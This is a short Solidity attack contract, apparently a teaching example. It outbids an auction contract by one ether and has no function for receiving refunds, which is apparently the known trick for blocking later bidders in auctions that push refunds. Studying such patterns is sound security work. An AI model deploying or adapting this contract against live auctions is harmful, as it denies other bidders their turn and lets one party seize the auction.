// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IAuction {
    function bid() external payable;
    function highestBid() external view returns (uint256);
}

contract AttackAuction {
    IAuction auction;

    constructor(address _auction) {
        auction = IAuction(_auction);
    }

    function attack() external payable {
        uint256 highestBid = auction.highestBid();
        auction.bid{value: highestBid + 1 ether}();
    }
}
